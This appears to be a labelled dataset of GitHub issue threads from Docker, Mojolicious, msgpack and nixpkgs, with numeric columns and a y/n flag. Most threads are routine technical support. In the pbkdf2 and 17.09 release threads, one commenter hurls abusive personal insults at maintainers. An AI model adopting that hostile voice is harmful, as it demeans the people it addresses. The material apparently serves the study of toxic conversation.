2019 at 1232 PM Russell Jurney russell.jurney@friend.com wrote  Disagree. Freeware can be proprietary software. What's community control? Projects run by a foundation? So you would consider VS Code, Atom editor, and Ubuntu as non-free software? Then your definition is significantly different from the one proposed by FSF, EFF, and many other organizations. I agree that Docker Inc is not actively discussing with community in this issue, but this has nothing to do with ""Free as in Freedom"".  Sorry folks, let's not have these sorts of discussions on the issue tracker. We have made it possible to support any build format you want to have via . The ""official"" Dockerfile format does not support this option, but that doesn't mean that  can't make use of it. Check out  as an example of building a custom frontend that works with . Note that this frontend is an example of how you can do something completely different from the Dockerfile format, but that is not necessary. You can take the existing Dockerfile format and add your own functionality if you like. As far as adding something into the official Dockerfile format.... I will say proposals are always welcome, the format is maintained in  in mind, though, every new feature means new burden of maintainership, including often limiting what can be done in the future. I think it's likely that many of the use case for combining multiple Dockerfiles can actually be solved with new functionality in Dockerfile... specicially the ability to  and  from arbitrary images.  If this hypothetical INCLUDE could just create the extra containers as an impl detail with me NOT having to give a @#$% it would greatly reduce the amount of frustration surrounding the implicit and dodgy sales pitch of composable containers. I really just want to get back to the application and delivering functionality. Sorry for the the bad vibes, but I am docker/container noob and ran into the same confusion that a lot of other posters have already expressed. ",65,85,642,0,0,496,17,y,
moby/moby/35447,0.078505215,moby,moby,How to set up Open WRT on Raspbian with docker? Help me please!,1932,13,53,0,2," /kind bug /kind error /sig docker /sig openwrt What happened I can't run this command in Raspberry Pi3 Raspbian docker. docker import  openwrt-x86-generic-rootfs docker images REPOSITORY                   TAG                 IMAGE ID            CREATED             SIZE openwrt-x86-generic-rootfs   latest              9015fa51eb3f        48 seconds ago      5.28MB &lt;none&gt;                       &lt;none&gt;              e4205a844e2b        19 minutes ago      5.28MB docker run -i -t openwrt-x86-generic-rootfs /bin/ash standard_init_linux.go195 exec user process caused ""exec format error"" ‚ô† I just want to Open WRT environment by Raspberry Pi3 on Raspbian with Docker.. What should I do? Anything else we need to know? Environment  Docker version (use ) Client Version      17.10.0-ce API version  1.33 Go version   go1.8.3 Git commit   f4ffd25 Built        Tue Oct 17 191344 2017 OS/Arch      linux/arm  Server  Version      17.10.0-ce  API version  1.33 (minimum version 1.12)  Go version   go1.8.3  Git commit   f4ffd25  Built        Tue Oct 17 190618 2017  OS/Arch      linux/arm  Experimental false  Cloud provider or hardware configuration Raspberry Pi3 on Raspbian  OS (use ) Linux raspberrypi 4.9.59-v7+ #1047 SMP Sun Oct 29 121923 GMT 2017 armv7l GNU/Linux  Kernel (e.g. ) Linux master 4.10.0-37-generic #41~16.04.1-Ubuntu SMP Fri Oct 6 224259 UTC 2017 x86_64 x86_64 x86_64 GNU/Linux  Install tools Docker-CE v17.10  Others  ‚Äª P.S  Could you recommend the way that how to set up Open WRT environment using docker images?  (you can't run x86 binaries on ARM)  Yes, looks like you're trying to run binaries for a different architecture, which won't work. Let me close this issue, because this is not a bug, but feel free to continue the conversation.  Could you recommend the Open WRT Image on my docker environment?  no idea; sounds like a better question for the Open WRT community; this showed up when Googling; ",4,0,103,0,0,143,4,n,
moby/moby/6604,0.04546087,moby,moby,Container fails to restart after upgrading (from 0.10.1 to 1.0.1) ,251,1,0,0,0,This is likely more informational and nothing actionable now.  It looks like a flag changed and it made it so my container could not start the container (nor did it start upon upgrading) Removing the container and restarting it fixes it; just seems ( ,1,0,5,0,0,3,0,n,
mojo/kraih/1238,0.065692238,kraih,mojo,delay helper is DEPRECATED,986,4,4,0.5,2," Mojolicious version 7.85 Perl version 5.28.0 Operating system macos  Steps to reproduce the behavior Just just the delay helper. Expected behavior A deprecation warning with explaination what to do, alternative options. How can i replace the helper code with what ? Actual behavior Warnings that delay helper is DEPRECATED. Problem warning without alternative options. User just panics that the code will stop to work one day.  Please use our official support channels.  This discussion is meant to either change/introduce documentation or code. You can mark it as a suggestion, but closing it is not very helpful. For instance, NetOAuth2AuthorizationServer tests upon installation produce many of these warnings, just as an example. It affects other CPAN authors along the way, and web searches should end up here, i suppose.  You did not propose any specific changes that could be discussed here. Until you reach that stage, please use our official support channels for discussions. ",5,0,24,0.25,0.25,38,1,y,
mojo/mojolicious/1236,0.12186981,mojolicious,mojo,Mojo::File::spurt: Wide character in syswrite,392,4,25,1,0, Mojolicious version 7.87 Perl version v5.26.1 Operating system ubuntu  Steps to reproduce the behavior perl -MMojoFile -le 'MojoFile-&gt;new(q(a.txt))-&gt;spurt(qq(\x{100}))' Expected behavior a.txt written with 2 bytes c4 80 Actual behavior get error Wide character in syswrite at /home/dk/perl5/perlbrew/perls/perl-5.26.1/lib/5.26.1/x86_64-linux/IO/Handle.pm line 483. a.txt is zero bytes ,0,0,46,0,0,15,0,n,
mojo/mojolicious/1238,0.10402667,mojolicious,mojo,"delay helper is DEPRECATED, but no transition options are given",428,2,3,0,0," Mojolicious version 7.85 Perl version 5.28.0 Operating system macos  Steps to reproduce the behavior Just just the delay helper. Expected behavior A deprecation warning with explaination what to do, alternative options. How can i replace the helper code with what ? Actual behavior Warnings that delay helper is DEPRECATED. Problem warning without alternative options. User just panics that the code will stop to work one day. ",2,0,10,1,0,22,1,n,
msgpack-python/msgpack/338,0.067134073,msgpack,msgpack-python,How to increase max_array_len,3389,45,41,0,2,"Hello, I upgraded from 0.5.x to 0.6.x and somewhere in the middle the option max_array_len has been reduced from 2^32 -1 to 128*1024. My application now breaks because the generated lists are too big. Is there any way to set the option from within my application? Something like msgpack.max_array_len = xxx ? Thanks  Why don't you search before asking here? It is written in docstring and document.  See also  Apologies, I did search the code, that's how I was able to pinpoint the issue. I was more looking for a global limit/configuration type of parameter, that I could set externally, like an environment variable.  Do continue on this issue, how do you disable the limits? The documentation states So, is it  or is it ? Additionally, the function signature for  has it specified to defaulting to , which isn't either of the previous values. Does -1 mean 128*1024, or does it mean INT_MAX - 1 (like I'd expect it to). In general, default arguments should be the default value, or none (for cases of mutable values, like list), in which case it is explicitly documented that passing none/-1/whatnot is internally translated to \&lt;default value&gt;.. Basically, the verbiage in the documentation isn't clear how all the options interact, and what values mean what. Additionally, it doesn't really make sense to me to have / etc.... do anything if  is set to 0 (INT_MAX), and having to specify a pile of options just to turn off safety checking for contexts where I'm shipping LARGE chunks of data back and forth between endpoints I control is annoying. I have a context where I pretty regularly have 100+ MByte messages.  Really, if you're going to have checking in place, add another class like  that does this stuff.  There are no way.  msgpack has it's upper bound (2**64).  So  is enough. Do you mean ""is it  or is it ? If  &gt;0, it's . If  == 0 (or other falthy values), it's . This usage of  is very common Python idiom. -1 is default value, and semantics for default value is described already. You don't have to ""specify a pile of options"".  (BTW, I don't think 5 is not ""a pile of"".  You can count it by one hand.) You can just use  (10GB) in such case.  If 10GB is not enough, you can use 100GB (if your machine have 100GB RAM). If I added it, people keep using  for untrusted source.  Security hole is keep living. Anyway, it's too late.  Making weaker than released version is not possible option.  My point was that no, it's not. And you still haven't specified if -1 means  or . Reading the docs page , I can interpret it either way. I mean, if you're writing code, yeah, but it doesn't help in the docs. And the general default value for ""use defaults"" is . Using -1 seems like you're writing C code, not python. If I needed to not specify anything previously, and the functionality is pointless, yes, it is a pile of options. So 0 means , except for , where it means . It'd be nice if 0 meant the same thing when passed to , ,  and . Having them all act differently is a great recipe for confusion. I don't agree this is a problem in the first place.  You might as well just make  return None in all cases, for any input, otherwise someone will figure out how to break something.  msgpack is JSON-like format.  Msgpack can be used anywhere JSON is used. It is used very widely, more than you think. And authenticated or not is not matter. That's why I released 0.6.1. ",11,16,184,0,1,107,6,y,
nixpkgs/NixOS/1131,0.08491843,NixOS,nixpkgs,Provide `buildGoPackage` function with $GOPATH setuphook,2512,37,16,0,3,"Currently packaging Go software is ugly, see  Anyone working on this?  I can take a stab at this. Here's what I had in mind in terms of usage go-update = buildGoPackage (fetchgit {   url = ""  rev = ""3f04666667"";   sha256 = ""34647689a50b9d12e85a280d9034cc1772079163481c4778ee4b3e6c4b41e2f4""; });  That is, it would merely wrap another derivation. How does that sound? I had an alternative idea that's a little more elaborate go-update = buildGoPackage {   url = ""  rev = ""3f04666667"";   sha256 = ""34647689a50b9d12e85a280d9034cc1772079163481c4778ee4b3e6c4b41e2f4""; };  I could infer the repository type just as  does. I could see value in both approaches - if only I could come up with decent names...  The first one () means that  can never be extended with other function arguments. Do Go packages always come from GitHub? Otherwise it's better to stick to the regular BTW, note that we now have a  function, which is preferable over  because it doesn't pull in Git as a dependency and is probably faster.  Good point. The Go compiler has hard-coded support for Bitbucket, GitHub, Google Code and Launchpad, with the expected url formats documented under ""Remote import paths"". As a side rant, the Go community's lack of discipline around versioning is rather annoying (with the Go compiler reinforcing the ""just pull from master"" attitude, as it doesn't allow for specifying revisions/tags). I have a plan for a ""go2nix"" tool that, given a release date, will traverse the import graph looking for revisions of each dependency as close to the release date as possible, ultimately generating a nix expression. I feel almost dirty suggesting such a thing, but it seems like the most practical approach to Go package automation, given the lack versioned releases... Yes, I was very happy to see that commit the other day - very nice ). I'll hack on this a bit and see what you think.  I wrote a tool to address this go2nix I'll try to get it into nixpkgs soon.  Btw all those symlinks are not needed in the ngrok example. GOPATH can be used instead, but I guess you know already.  @friend ngrok's Makefile expects that it can spit out some source code in it's source tree, so it's actually easier to just dump all the go package sources into the same store path, rather than just having a GOPATH entry for each and needing to special case the ngrok directory. I figure there will be plenty of other projects that behave similarly, so I think it's easier to just pile everything into the same folder.  This is done. ",12,3,105,0,0,65,3,n,
nixpkgs/NixOS/22340,0.047712755,NixOS,nixpkgs,Build profiling libraries in 'haskellPackages' by default?,8365,94,64,0,3,"Serious Haskell hackers need to profile their code, and that requires special variants of the libraries involved in the build. By default, we don't build those libraries. Should we? If we do, then I see the following options  Provide separate package sets (e.g.  and ) and selectively enable both variants on hydra.nixos.org for appropriate compiler versions, i.e. for the default compiler that's used to build , too. This means that users get the non-profiled package set by default, but they can switch to the profiled package set if they wish to do so. Pros  Users who wish to use profiling can do so. Users who don't profile see no difference, i.e. they don't have to download larger packages or deal with increased closure sizes, etc. Cons  We let  compile every library 5 times (static, dynamic in non-profiling package set, static, dynamic without profiling plus static with profiling in the profiling package set). This is going to slow down our builds, no doubt, and it's also doing to slow down other, non-Haskell builds. The amount of data our binary cache has to store increases by a factor of 2.5, approximately, because we upload the profiled packages in addition to the non-profiled ones. Hard-linking the identical files in both variants won't work because  doesn't produce deterministic binaries across re-builds of the same code.     We can enable profiling by default in our main package set, . Pros  Users who want to profile their code can do so without any manual effort at all -- everything just works. Cons  Hydra has to compile an additional variant of every library, which will increase the build time by a factor of 1.5, approximately.  The disk space and bandwidth requirements on  increase by a factor of ~1.5, too. We increase the build-time and runtime closure size of every dynamically linked Haskell derivation (that is almost all of them) by a factor of ~1.5 for all users, not just for those who care about profiling. That issue could be mitigated by placing profiling libraries into their own derivation output, but it's not clear whether this can be accomplished easily and the corresponding ticket,  has made no progress in the last 2.25 years, so it's not obvious why a working implementation of that feature should pop up out of the blue right now.      Opinions?  This isn't really a community discussion, is it? Whoever is paying for Hydra can decide this unilaterally. Technically, it would probably be possible to modify GHC such that it would output both profiling and non-profiling in once pass, if anyone wanted to do any engineering on it, that is.  I'm in two minds about this At LumiGuide we use option 1. We care about small closure sizes since some of our machines are connected to the internet through mobile links with limited bandwidth. Although option 2 would be simpler and thus more user friendly which IMHO weighs more heavily than our specific requirements. So for me it's a +0.1 for option 2 and I hope  will make progress.  I believe that this is more a question of what the user wants, or rather what we want the user experience to be like. Whether Hydra will cope with the load or not is a subject of speculation. Nobody really knows and we're probably not going to get a definite answer to that question. IMHO, we should chose whatever the best solution is and then try it.  At Takt we use a mixture of options 1 and 2. For all non-Takt code we use option 2, but then for our own code we use option 1 (in fact we go even further We have a package set enabling optimizations for our packages, and another package set disabling them). This has worked quite well for us, because we only have to compile our dependencies once and they will satisfy the needs of any option 1  alternative we might want to use for our own code. With this in mind, I lean towards option 2, as I think it leads to a more rewarding stock experience for users. Those needing smaller closure sizes can tune these things a bit. By the way, besides setting  and  to , we are adding this to our   If we go with 2 plus multiple outputs, we can still get small closures  Your own packages , or over the entire package set? If it's the latter, I really wouldn't want that in ! Almost everything on Hackage should have no profiling information added unless a flag is turned on. The fact that some packages unilaterally export  is a bug of those packages - it just poisons profiling information. But if it's just your own stuff, then of course that makes sense (though I'd still suggest using  in your cabal files, and protecting it with a flag).  @friend I agree with your thoughts. This works well for our use case (although fortunately we don't need to do profiling very often!), but for  we probably don't want these as default.  seems to be useful for stack-traces, though, which maybe is something worth having by default  Still a ""please no"" to that. That's a ton of information in  output, most of which will be outside my control anyway.  Hmm... maybe this highlights a problem, then Seeing as ""enabling profile information"" can mean different things depending on the flags passed to the compiler, does it make sense to provide a profiled Haskell package set at all if it won't satisfy the profiling needs of most people?  The only reason I want a profiling set is so I can compile my code with profiling. Ultimately, any called library code will show up in my own profiling by making my own calls themselves slow. I profile with the attitude of ""vendor code is efficient, my code is inefficient"". Only after ruling out my own code as being problematic do I want to start seeing the gory internals of other code. And even then I gradually opt in and work my way ""down the stack"", so to speak. On Mon, 6 Feb 2017, 634 pm Renzo Carbonara, notifications@friend.com wrote  @friend I can agree with that reasoning üëç  It's hard to decide which one solution is best. After some thought, I lean towards enabling profiling library builds by default in the upcoming  release branch (but not in ). The rationale for that choice is that I assume ""end-user types"", who benefit the most from this change, to be most likely using the release branch rather than following git . People who follow git , on the other hand, I assume to be able to accomplish whatever they need by means of overriding the default configuration. Having profiling enabled by default gives more convenience to normal users, but it's a disadvantage for power users who want to create their own. minimal installations for production. Again, here I assume that those people know how to override the configuration in order to do exactly what they need. I'm sure this is not the best solution, but I can't think of any better one.  Eh, I'm -1 on release branches behaving differently that way. The ""normal user"" ""git master user"" distinction is not one we want to make bigger!  OK, I suppose I won't enable profiling builds on  at all since there is no obvious solution how to do it in a way that's sufficiently beneficial for our users to warrant the costs such a change would incur. I'll leave the ticket open for now, nut I'll remove the  label.  I think option 2 is really the way to go for now. The main drawback is really going to be the increased closure size. @friend highlights a concern here due to the link to deployment machines being a bottleneck, but I wonder - do you compile into a static binary? At CircuitHub we have found the smallest closure is to build a statically linked executable and then strip it. In this case, I'm not sure the inflation of profiling libraries would make a difference, and they would become a development-only cost.  @friend at LumiGuide I recently wrapped all our Haskell executables in  and I was very happy with the results. For our image analysis server  closure size went from 2490.53 MiB to 1668.72 MiB. output size went from 26.70 MiB to 22.87 MiB.  So I don't have a problem anymore with option 2.  If the profiling versions of libs can't be supplied by , I think I've reached a reasonable approach for achieving it manually.  @friend does the recent multiple outputs stuff change things here?  This will make a huge difference. Thanks for sorting this Peti!  It's very good that we now have profiled libraries available from the cache. No need to build our own profiled libraries anymore. Thanks peti!  Oh interesting. ",39,15,259,0,0,151,12,n,
nixpkgs/NixOS/27244,0.138371797,NixOS,nixpkgs,Cannot comment anymore,2418,38,22,0,1,"Issue description GitHub says ""You can't comment at this time."". Steps to reproduce Comment too much?  I don't think so.  The conversation is unlocked and I haven't seen ability to block particular contributor-thread pairs.  Sometimes I got such errors transiently due to network failures.  Still, there might be stuff I've missed...  @friend I just tried in another random thread opened by @friend and I suspect he has me on his blocked users list. I didn't know that was how the feature worked, but I suspect that's how it works.  @friend As a consequence, he would also not see my @friend. So, if someone could ask him to reconsider would be swell.  Ah, yes, that's probably what's happened.  @friend, you have been blocked from the organization, due to your hostile behaviour towards contributors.  @friend IMO @friend should be unbanned. He/she/they has a really strange and trollish way of talking, but there should be some warnings first, before ban. Perhaps he/she/they were warned already? @friend commenting on your opinion that looks... great! I've looked through some of his reviews, and all of them were on-topic. The way I see it, @friend has a constant 1y+ interest in Nixpkgs/NixOS projects and wants them to be improved, just like me.  I'd personally think that raising this ticket and finding to be banned by an individual member should have been a warning by itself, and a day or two after that there was that ""final"" thread...  I added this user to my personal block list almost exactly a year ago (2016-06-07), where I asked another person in the community to block them. At that time, I noted that they had recently been blocked by other major projects as well. At that time, I asked the other community member I messaged to review some other threads this user had been part of. This resulted in those threads being updated, to remove the nastiness. In my opinion, the most valuable thing we have put together is our welcoming and supportive community. Anything that jeopardizes that jeopardizes the future of NixOS. I don't volunteer my time here to be berated, and I don't think anyone else does, either. I love this community, I deeply appreciate all the hard work from all the hundreds of contributors, and absolutely support @friend's decision to remove people who make it unpleasant to be part of an otherwise top notch group.  Another instance of a negative conversation in a Pull Request ",9,1,97,0,0,53,3,n,
nixpkgs/NixOS/27258,0.07041209,NixOS,nixpkgs,pbkbfd: Don't use brittle C functions,6442,80,33,0,2," should be using the POSIX 2008  instead of fgets. If, for some reason there are targets that do not have POSIX 2008, add configuration flags to also accommodate for non-POSIX 2008 systems, develop a NixOS module to control this behavior with sane defaults set depending on the platform (which also should be integrated with the installer eventually). (Feel free to create other tickets for these tasks, if need arises.) @friend Version master  I don't use NixOS/nixpkgs anymore, so feel free do do what you want, but with regards to your claim that it should not use ""brittle"" C functions you have to substantiate such claims, i.e. prove what supposedly makes  (which has well defined behaviour) ""brittle"" in this specific context. @friend  Seems to me that if the user enters a NUL, the current code will ignore everything the user enters after the NUL (strlen stops at first NUL, whereas fgets is happy to continue reading until newline). If users feed binary data to this program, the input key passed to the kdf may be substantially shorter than expected. No idea if there are any practical implications re how this program is intended to be used, though.  Correct, but using  won't change that, since the required delimiter would still be a newline. The pbkdf2 wrapper (and that program is nothing more) exists to derive a binary key from a non-binary (human memorable) passphrase + binary (hex encoded) salt. If you already had a binary key, you wouldn't need to use a kdf.  Truncation occurs because of , which  solves by reporting the number of bytes it read.  Presumably, the strength of the derived key would be unaffected by truncation, but it seems recovering the key could accidentally become easier. As long as users never feed strange inputs to the program, there's no problem, but I think it's unfair to discount the potential (whether or not it's worth doing anything about it).  Thanks, I overlooked that; this is a good argument for replacing the + pair with , though as I said, I haven't used this (in a long time) and unless someone else still does you should just drop the whole thing (and keep it from bitrotting further). No, because the derived key is used exclusively for accessing an already encrypted LUKS volume. The input is retrieved via explicit shell prompt at boot time and then fed into the program and you can't enter a null byte on the kernel tty (so you wouldn't use one when setting up the LUKS volume, anyway).  There is a reason I remembered this quote when I read your message.  That's your prerogative, but irrelevant to the issue at hand.  @friend What is the issue at hand according to you? I can imagine that technically and even mathematically there is no problem, but the thing is, I don't even want to read an explanation of an analysis written by in this case the original author. Not because I don't believe it to be correct, but it's because I don't want someone else to also have to understand that analysis in order to believe the code works. It's simply more costly from a maintenance point of view to require such reasoning. Consider that someone wants to call this code from another context and then the whole analysis needs to be done again (and typically is never done and it results in a bug). Also note that you haven't even documented a valid input specification. Really, your code is just a disaster waiting to happen and you apparently need to have this explained multiple times before you get it, and perhaps you will never get it. There are more issues with your code, btw. For example, you make implementation choices when applying an algorithm that are not referenced to scientific literature or with any other kind of justification. In short, I would consider this code written by someone who can instruct a computer what to do, but just lacks the wisdom to tell the computer the right things to do.  The issue is that (as written above) the + pair should be replaced by  iff. it's worth for this project to keep the functionality provided by the semantic block it belongs to. That's not for me to decide, since I don't use it anymore. Again, your prerogative, but not relevant to the issue at hand. That is always the case if one reuses a piece of code in another context. This is not new. That's a mistake of the person reusing C code for another purpose without doing the proper analysis. Of course not, it's an internal component, not part of a public interface. The code will result in disaster when someone abuses an internal component for a different purpose without analysing whether its applicable. Your continued ad hominem attacks (after providing an incomplete bug report) remain irrelevant. That would only be an issue if the derived key was used for something other than decryption of preexisting encryption. As I have pointed out before, your personal attacks serve no purpose with regards to this issue.  @friend The hole you been digging for yourself is now so deep that all I have to do now is to give you a little push. Did you know your C program has undefined behavior?  Since after a civil reminder you insist on keeping up the hostile and - frankly - abuse behaviour, I won't spend more of my time on you )  @friend You are the one who kept insisting that the code was good and that only if others would make a mistake (implying that you are the god of programming) that there would be an issue. Then finally, when I have carefully positioned you such that there is no escape left, you start to cry like a little baby about how hostile I am? You were acting as the most obnoxious person I have ever seen here and you needed to be taught a lesson in humility. The trait most people like you have is that they are unaware of their own limitations and they just keep on sharing their incompetence with the rest of the world. It is pathetic.  @friend I've blocked you from the NixOS organization. This isn't the first time you've engaged in personal attacks on contributors, and I've had enough.  @friend Don‚Äôt let that behaviour get to you; the person suddenly appeared a few days ago (see their profile) and started commenting hundreds of issues/PRs, always with a doubtful attitude. I wasn‚Äôt sure what to make of it because it seemed like they were contributing, but apparently they just wanted to burn stuff. Nothing gained nothing lost I‚Äôd say.  I approve @friend actions, FYI. @friend you're very welcome to reopen the PR, I'll review it shortly. ",24,17,189,0,0,124,3,y,
nixpkgs/NixOS/31045,0.299854925,NixOS,nixpkgs,Release quality 17.09,19212,231,127,0,4,"At NixCon 2017 it appeared as if the release managers thought their release went well. Via this message I would like to provide some data to the contrary. I tried to upgrade on two different machines to 17.09 and none of them worked without reconfiguration or without removing features. As such I am still stuck at 17.03 on both and haven't bothered upgrading other machines. For example  Skype doesn't work anymore (broken download) Flash failed (has been fixed, but by the time 10 people have discovered it, you already failed) NFS with autofs or systemd doesn't work due to a missing symbol (open for months)  It is great that doing a rollback was possible (although it does restart the network connection, which would result in some downtime on production infrastructure), but as far as I am concerned no working 17.09 release with feature parity from 17.03 has been released. I am also not happy with the discontinued support of 32 bits code when other distributions still support newer 32 bits code. Not sure whether this is specific to 17.09. There are just a small number of critical packages that tens of millions of people use of which Skype and Flash are an example. NFS is used by a lot of businesses and as such should also be considered important. I don't understand how one can make a release without systematically creating tests based on e.g. Debian's popcon download measures to see whether a package still works. If a release has any QA done on it, I have missed it. What is the point of tagging some git version as a release when the QA on it is non-existent?  Flash and Skype in Debian's popcon? -)  I must say our QA for unfree packages is inherently worse just because of the policy not to allow building such packages on the build farm.  To remain positive, QA done specifically for the release   A critical test-set is checked before every channel bump, too, though it would certainly be nice to have more tests.  You may have noticed a couple proposals around tests on NixCon 2017.  Hi there! Yes, indeed, we are quite proud of our release. We merged thousands of pull requests, addressed many many issues, added lots of services and packages, and included many security updates. Our community has also grown quite a lot, and we are proud and excited by the growth and progress of NixOS. You've had a less good experience, and that sucks. It seems you fall in to somewhat less tested areas of NixOS, and that is certain to expose you to sharper corners and more broken things. I'm sorry you  did! Please try upgrading your remaining machines, as 17.03 is no longer supported. We'd rather dedicate everyone's efforts to making 17.09 work sufficiently well. It seems that two of your issues are with unfree software, which NixOS doesn't officially test in any capacity. This is by policy, so any sort of testing on these packages will have to be by volunteer contributors on their own time and hardware. If you'd like to help with this, I'd be happy to work with you to help set something up. Your third issue about NFS NFS with autofs or systemd doesn't work due to a missing symbol (open for months)  Luckily, it seems one of our volunteer contributors has a patch! Maybe you could try it out on your system, and reply to the PR  I don't see an issue about this. Can you open one? When I call , I don't have this issue ... Hmm... Unfortunately NixOS is a small distribution without substantial corporate backing. We still support and build some software for i686, but as you say, we no longer support entire i686 systems. It was a very difficult choice, as we didn't want to leave users without updates, but we believe it was worth the decision. x86_64 has been available for 17 years now and covers almost all of the modern hardware. Dropping i686 support has significantly improved our ability to test and release NixOS. What were you using i686 for? Regarding NFS We have automatic testing of NFS 3 and NFS 4, which pass   tests automatically create servers and clients and run thorough tests to ensure our NFS support works. I think that is pretty good, and pretty cool! However, it doesn't cover the autofs case. Perhaps we should add that to the test? Would you like to send a PR adding it? If so, I'd be happy to do an IRC chat or video call to help you. Maybe you're not familiar with the extensive, innovative automatic VM testing we already do? I think it is pretty cool, and many distros don't have as robust of a test framework we do. Please remember that NixOS is operated by a very wonderful group of volunteers, and your negativity isn't welcome. If you would like to learn about our release proceses, we'd be happy to show and teach you. If you would like to learn about our QA process, we'd be happy to show and teach you. If you would like to become a contributor and help scratch your own itches, make NixOS as good as it can be for your use cases, we'd be happy to show and teach you. If you would like to contribute enough money to hire a team of full time people to work on and support NixOS, we'd be happy to work with you. Thank you, Graham Christensen  I'm pretty sure I cannot add much to @friend's awesome response, except to say we're sorry that you had issues and want to emphasize that we try to deliver the best experience possible but sadly don't have infinite resources and even by far not as many as debian etc.  Updated the nixpkgs manual and the wiki that we cannot test or build unfree packages.  @friend I upgraded one server to 17.09. Another system upgrade broke idempotency. That is, . It is my understanding that the NixOS organization claims to achieve the opposite. The i686 device is an end user laptop. If it runs a browser (don't care which one as long as it is graphical) and an ssh client. Regarding your tests, I took a look at one of your links and found a build with a green checkmark which said (  ) to me that says that the QA on the tests themselves is lacking. One of the prerequisites for testing an application is a working system. That is already not working here, so at that point I stopped reading output. While everyone hearts your reaction, this self congratulatory attitude seems overly positive. Perhaps I have different metrics regarding success, though. For example, you count thousands of PRs being merged as an achievement. I count the work of e.g. Ericson2314 as one feature of interest (if it works) despite it being spread out over many PRs. As a leadership principle, undesired behavior should not be encouraged. By celebrating a meaningless metric like the number of merged updates, you only achieve tired contributors (because pressing a merge button cannot possibly be more boring), who at some point will be bored and stop. When people dig a tunnel with a teaspoon you are the one cheering to the team, while I am there thinking why don't they call 3M? Your message about my ""negativity not being welcome"" seems to be straight from SJW hell. While Nix and NixOS do some things pretty good, there is also a lot of stuff which is terrible. Implying you only want ""happy thoughts"" essentially is not leadership, it's a culture suited for the gulags. When someone throws shit in your face, are you also going to describe it as a warm welcome gift? I am not sure whether this is an American thing, but I can assure you that it is not normal to take criticism this badly. In short, your message is more passive aggressive than it should receive a heart. In the future stick to the facts please. The facts are that 17.09 was not ready for use, even today. @friend You are allowed to test and build unfree packages in a lot of cases. Redistributing the resulting builds just is not always allowed. But distributing the recipe for building something and claiming you have followed that recipe and ended up with something that works is perfectly fine. There are a few database vendors which say that you cannot publish benchmarks, but simply saying that you cannot do it, is just lying. Perhaps you don't want to do it or you have no interest in it. Perhaps there is nobody in the entire community interested in it. That still doesn't mean that it cannot be done. So, building a piece of software and then not distributing it to entities who are not a member of the NixOS organisation is perfectly legal. This particular contribution to the manual is of negative value, because it doesn't reference any policy and provides no legal reason. As such, you have just inflated the size of the manual prematurely and someone else (me in this case) needs to point out the fact that you need to redo it again.  Upgrade broke idempotency Could you please elaborate what broke for you? Did you open an issue for that? Claiming something broke without mentioning what or any further explanation is not polite. Why? What are the issues that should be fixed in your opinion? You can't expect everything to be bug-free, even with extensive testing in place. Just look at other community-driven distributions for a reference. Errors happen, may they be in the code or in its tests. nfs4 NixOS Test This could be a bug in the test that nobody noticed before. We should fix that but that doesn't mean that all NixOS tests and their QA are inherently inadequate. Even though the kernel printed a stack trace the VM seemed to work fine. I can't pinpoint an actual cause for the stack trace after a quick look. Unfree packages Our CI system is not able to build packages without pushing it to the binary cache at cache.nixos.org. This would require some code changes. You're free to implement this. As nobody has done this yet or opened an issue that I know of there doesn't seem to be much interest in it. I don't agree that the manual change is useless and that I am lying. It just clarifies that we can't support unfree software unless we look at each license/EULA on a case-by-case basis (""most""). This is the legal reason. If you have a suggestion to improve the wording, please do send it to me or open a PR. You're also welcome to help to add license abstractions for unfree software that we can build, distribute or run. We're just putting everything in the unfree category so we don't have to deal with that. Personally, I'm not interested in improving the unfree packages situation in my spare time and any help is appreciated.  Unfree packages I don't see it as being that much about legal reasons but about current policy for the build farm &ndash; it disallows building ""unfree"" packages and now it's explicitly written down in docs.  Note that many distributions don't even allow them into the main repository.  I'm personally not too motivated by them, but if enough people are interested, surely they can put together a Hydra instance doing the additional unfree tests (and write them first, actually ). Negativity I'm personally not at all against criticizing etc. but it seems only useful if it's done in a ""productive way"", i.e. focused on fixing those problems.  For example, you claimed that idempotency got broken but you provided almost no information about it (so far).  @friend It's not that I don't want to provide information. The available logging information was limited. I got a ""Warning"" that a service didn't restart correctly, but running  directly afterwards did succeed. I looked into  and  and didn't see the details that were needed for a quick resolution. I wouldn't mind running a Hydra instance for a limited number of packages, but not as long as I can't just copy paste something complete in my configuration.nix. @friend The font issue mentioned is the most user visible problem and that's 100% open-source code. If there is an intention to make things better, one could setup a canary machine that compares pixels for various terminal emulators as well as e-mail programs for different versions for rendering 'the quick brown box...'. The reason this would be a reasonable approach is that desirable font changes for a given machine for the same configuration are extremely rare, while searching for ""broken fonts"" on a search engine returns many results. It is a recurring problem resulting from a lack of QA processes. Implementing something like this could be done on various levels, but starting a terminal emulator, waiting for the window to exist with e.g. wmctr, making an automated screenshot (with scrot) and comparing the image to the reference image for equality seems to be in the realm of the possible (that could be a call to diff). Once that is in place, the same tests could be run on virtual graphics devices and shipped to end users even. End users could select that they want to opt in to the test program, where differences would result in an automatic rollback. That way they don't even need to report that their NVIDIA GTX1070 with sprinkles has a problem. Instead, they would just upgrade the next week, possibly automatically, and they would have never seen there was a problem in the first place. I agree that it would be better if Microsoft would maintain a Nix expression for Skype, but since they don't do that... If there was an open-source alternative for Skype, I wouldn't mind to share those with my contacts, but the last time I tried to use one, it didn't end well. Regarding the legal issue You should first establish that there is even a single EULA on this planet which says that you are not allowed to talk about the mere fact that a particular Nix expression accomplishes something when installed on your infrastructure. You can write a whole book about doing highly illegal things. In fact, in the case of Nix it's a mathematical theorem Given a complex state machine (a computer), and then executing a particular program will result in a particular bit being set to 1. There is no way that's illegal. A less contrived argument is that it falls under interoperability laws and you are perfectly allowed to reverse-engineer even Oracle software for such work. I am fairly sure that Oracle would be happy to see its software work on NixOS out of the box with an integrated payment system so they can more easily take your money. It's just that NixOS is so incredibly insignificant right now that merely looking at this website won't have a positive ROI for them. Doing much more than this, like running actual benchmarks and publishing those is against the EULAs of some companies, but that's a completely separate topic. So, my point stands. Legally, your arguments are not sound. If you don't want to do work for free, that's an understandable position, but don't make up legal arguments based on nothing. Just because something is community driven, doesn't mean quality has to suffer. Comparing yourself to other distributions doesn't lead to a significantly better system. The reason NixOS exists, is because all the other distributions were designed badly. The other systems cannot and will never work.  I don't think that will work reliably without repeated maintenance.  There isn't one way to render fonts, and freetype+fontconfig do change the (default) rendering a bit, from time to time.  Still, if someone was manually checking it whenever it changed and somehow was building up a database of acceptable renderings... it might work well and it would be better QA, yes.  (It's not high on my own priority list, but why not have them.) BTW, we do have some VM tests with OCR, screenshotting, etc.  The VM tests aren't very resource-efficient, and some are planned to be migrated to containers, but everyone is welcome to write more tests.  I'm certain we can 